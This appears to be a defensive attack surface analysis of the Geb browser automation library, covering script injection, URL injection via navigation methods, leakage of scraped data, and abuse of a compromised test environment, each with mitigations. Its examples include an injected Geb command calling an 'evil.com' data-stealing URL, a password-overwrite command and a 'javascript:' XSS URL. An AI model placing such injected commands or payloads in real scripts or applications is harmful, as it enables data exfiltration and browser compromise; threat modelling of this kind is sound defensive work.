# Attack Surface Analysis for geb/geb

## Attack Surface: [Geb Script Injection via User-Controlled Data](./attack_surfaces/geb_script_injection_via_user-controlled_data.md)

*   **Description:**  Malicious users can inject arbitrary Geb commands if the application allows user-controlled data to directly influence Geb scripts.
    *   **How Geb Contributes:** Geb's powerful scripting capabilities allow for complex browser interactions. If these scripts are built dynamically using untrusted user input, it creates an injection point.
    *   **Example:** An application allows users to define custom browser automation steps via a configuration file. A malicious user could insert Geb commands like `browser.driver.get("http://evil.com/steal_data")` or `$("input[name='password']").value("attacker_password")` into the configuration.
    *   **Impact:** Arbitrary browser actions, data exfiltration, potential local file system access (depending on browser configuration).
    *   **Risk Severity:** **Critical**
    *   **Mitigation Strategies:**
        *   Avoid dynamic script generation.
        *   If dynamic script generation is unavoidable, rigorously sanitize and validate all user inputs using whitelisting of allowed commands or parameters.
        *   Run Geb scripts with the minimum necessary privileges.

## Attack Surface: [Injection via `to()` and `at()` Methods with User-Controlled URLs](./attack_surfaces/injection_via__to____and__at____methods_with_user-controlled_urls.md)

*   **Description:**  If the application constructs URLs for Geb's navigation methods (`to()`, `at()`) using unsanitized user input, attackers can inject malicious URLs.
    *   **How Geb Contributes:** Geb's core functionality involves navigating web pages. Using user input directly in these navigation methods creates a vulnerability.
    *   **Example:** An application takes a website URL as input from the user and uses `browser.to(user_provided_url)` to navigate. A malicious user could input `javascript:alert('XSS')` or a link to a phishing site.
    *   **Impact:** Navigation to phishing sites, exploitation of browser vulnerabilities, potential execution of JavaScript in the browser context.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   Thoroughly sanitize and validate all user-provided URLs before using them in Geb's navigation methods. Use URL parsing libraries and validate against a whitelist of allowed protocols and domains.
        *   If possible, avoid directly using user input for navigation. Instead, use predefined or validated options.

## Attack Surface: [Exposure of Sensitive Data Retrieved by Geb](./attack_surfaces/exposure_of_sensitive_data_retrieved_by_geb.md)

*   **Description:** Sensitive data extracted from web pages using Geb is not handled securely within the application, leading to potential exposure.
    *   **How Geb Contributes:** Geb is used to automate the retrieval of data from web pages. This data might include sensitive information.
    *   **Example:** Geb is used to scrape data from a website, including API keys or user credentials embedded in the HTML. This data is then logged to a file without proper redaction or encryption.
    *   **Impact:** Leakage of sensitive information, potentially leading to account compromise, data breaches, or further attacks.
    *   **Risk Severity:** **High** to **Critical** (depending on the sensitivity of the data)
    *   **Mitigation Strategies:**
        *   Treat data retrieved by Geb with the same security considerations as any other sensitive data within the application.
        *   Avoid logging sensitive data. If logging is necessary, redact or mask sensitive information.
        *   Store retrieved data securely, using encryption at rest and in transit.
        *   Only retrieve the necessary data.

## Attack Surface: [Abuse of Geb's Browser Automation Capabilities in a Compromised Environment](./attack_surfaces/abuse_of_geb's_browser_automation_capabilities_in_a_compromised_environment.md)

*   **Description:** If an attacker gains control over the environment where Geb is running, they can leverage Geb's browser automation features for malicious purposes.
    *   **How Geb Contributes:** Geb provides powerful tools for controlling a web browser. This power can be abused if the environment is compromised.
    *   **Example:** An attacker gains access to a server running Geb-based tests. They could modify the scripts to perform actions like launching denial-of-service attacks against other websites or scraping sensitive data from internal applications.
    *   **Impact:** Denial of service, unauthorized data access, potential compromise of other systems.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   Implement robust security measures to protect the environment where Geb is running, including access controls, intrusion detection, and regular security updates.
        *   Run Geb scripts with the minimum necessary permissions.
        *   Regularly review Geb scripts for any potential vulnerabilities or malicious code.
